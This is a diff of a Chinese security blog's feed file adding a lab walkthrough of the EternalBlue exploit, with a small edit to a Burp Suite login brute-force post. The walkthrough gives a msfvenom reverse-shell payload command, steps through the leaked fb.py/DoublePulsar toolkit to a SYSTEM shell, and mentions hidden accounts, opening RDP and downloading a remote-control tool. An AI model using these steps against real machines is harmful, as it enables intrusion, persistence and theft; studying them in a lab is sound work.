@@ -3,6 +3,36 @@
   
     
     <entry>
+      <title><![CDATA[方程式 Eternalblue 漏洞利用复现]]></title>
+      <url>/2017/04/29/%E6%96%B9%E7%A8%8B%E5%BC%8F%20Eternalblue%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0/</url>
+      <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2000/xpSp0/1/2/3/2003Sp0/1/2/3、VistaSp0/1/2/2008Sp1/2/xp_x86Sp0/1/2/3xp_x64Sp1/2/2003ServerSp0/1/2/Server2008Sp0/1/2/win7Sp0/1/Server2008R20/1/Win8Sp0/Server2012Sp0</div></pre></td></tr></table></figure>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1.开启了445端口即可。<br>2.大多数版本需要关闭防火墙。</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理:"></a>漏洞原理:</h2><p><a href="http://www.91ri.org/16946.html" target="_blank" rel="external">http://www.91ri.org/16946.html</a><br>(我看了半天愣是没看懂)<br>然后找了个比较简明的看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">首先SrvOs2FeaListToNt首先调用SrvOs2FeaListSizeToNt计算pNtFea的大小。这里注意了SrvOs2FeaListSizeToNt函数会修改原始的pOs2Fea中的Length大小,本来Length是一个DWORD, 代码还强制转换成了WORD,不能不让人联想一些事。然后以计算出来的Length来分配pNtFea.最后调用SrvOs2FeaToNt来实现转换。SrvOs2FeaToNt后面的判断就有问题了。这里还不止一个问题。 </div><div class="line">1. 转换完成后，增加pOs2FeaBody然后比较。正确的逻辑难道不应该是先判断再转换吗？ </div><div class="line">2. 由于SrvOs2FeaListSizeToNt中改变了pOs2Fea的length的值，这里使用变大后的值做比较，肯定会越界。</div></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机：<br>Win7 旗舰版 x64 关闭防火墙 IP：192.168.26.129 开放445端口<br>攻击机A：<br>win7 旗舰版 x64 python2.6（32位）、对应的pywin32 IP :192.168.26.129<br>攻击机B：<br>kali2.0/任意安装了msf的Linux/可以被反弹获取后门权限的设备<br>这里我用的是kali2.0 IP:192.168.26.128</p>
+<p><strong>（没错，靶机和攻击机A是同一台，因为电脑配置渣，开不起第三台我就双向利用了。）</strong></p>
+<p>exp下载链接：<a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="external">https://github.com/misterch0c/shadowbroker</a> </p>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>1.在攻击机A安装好<code>python-2.6.6.msi</code>，<code>pywin32-221.win32-py2.6.exe</code></p>
+<p>2.在攻击机B先生成一个payload。启动MSF。因为靶机为win7、X64位。<br>启动后对应的命令为:<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.26.128 LPORT=5555 -f dll &gt;test.dll</code><br>（注意创建的）</p>
+<p>3.把生成的payload传给攻击机A。</p>
+<p>4.打开EXP。即fb.py(现在根目录创建listeningposts文件，或者打开fb.py注释有关listeningposts的条目)</p>
+<p>输入：<br><img src="http://i.imgur.com/wD2LNdg.png" alt=""></p>
+<p>5.跳到fb后输入:<br><img src="http://i.imgur.com/6qrYJwq.png" alt=""></p>
+<p>6.一直回车确定，直到出现<br><img src="http://i.imgur.com/nu4YPtO.png" alt=""></p>
+<p>7.一直回车，直到出现如图，开始跳到Doublepulsar模块<br><img src="http://i.imgur.com/Gpv3SrA.png" alt=""></p>
+<p>8.一直回车，直到出现如图再选择：<br><img src="http://i.imgur.com/RAhw4yS.png" alt=""></p>
+<p>9.一直回车，直到出现<br><img src="http://i.imgur.com/G9AXXTu.png" alt=""></p>
+<p>10.返回攻击机A，查看msf,发现已成功反弹，执行shell命令。<br><img src="http://i.imgur.com/IbrCWwJ.png" alt=""></p>
+<p>11.成功得到System的权限并使用CMD命令进行相应操作。<br><img src="http://i.imgur.com/WxgakuR.png" alt=""></p>
+<h2 id="得到的反弹shell还可执行的其它操作"><a href="#得到的反弹shell还可执行的其它操作" class="headerlink" title="得到的反弹shell还可执行的其它操作"></a>得到的反弹shell还可执行的其它操作</h2><p>1.在第10步输入help，可查看此shell能执行的操作<br>screenshot  截图桌面<br>webcam_snap  拍照功能。</p>
+<p>。。。</p>
+<h2 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h2><p>利用命令开3389，并且创建隐藏账户<br>利用system权限远程下载一个远控</p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[提权技巧]]></title>
       <url>/2017/04/26/%E6%8F%90%E6%9D%83/</url>
       <content type="html"><![CDATA[<p>提权：在我们拿到一个webshell之后，我们需要得到服务器的权限，从webshell权限到服务器的权限是一种提权。<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而当我们是一个普通用户的时候，提升到服务器的超级用户的过程，这也是一种提权。<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般我们都是使用菜刀的功能(虚拟终端)提权<br><a id="more"></a></p>
@@ -189,7 +219,7 @@
     <entry>
       <title><![CDATA[burpsuit爆破后台]]></title>
       <url>/2017/04/23/burpsuit%E7%88%86%E7%A0%B4%E5%90%8E%E5%8F%B0/</url>
-      <content type="html"><![CDATA[<p>此次测试条件：<br>1.后台没有token验证<br>2.验证码不点击这个则不刷新<br><a id="more"></a><br><img src="http://i.imgur.com/Rt473Oa.png" alt=""></p>
+      <content type="html"><![CDATA[<p>此次测试条件：<br>1.没有token验证<br>2.不点击错误提示则不刷新验证码<br><a id="more"></a><br><img src="http://i.imgur.com/Rt473Oa.png" alt=""></p>
 <hr>
 <p>所以较简单，使用burpsuite即可，<br>1.抓包，并发送去Intrude<br><img src="http://i.imgur.com/pZcPKaC.png" alt=""></p>
 <p>2.设置Intrude<br><img src="http://i.imgur.com/Fsg5ubp.png" alt=""></p>
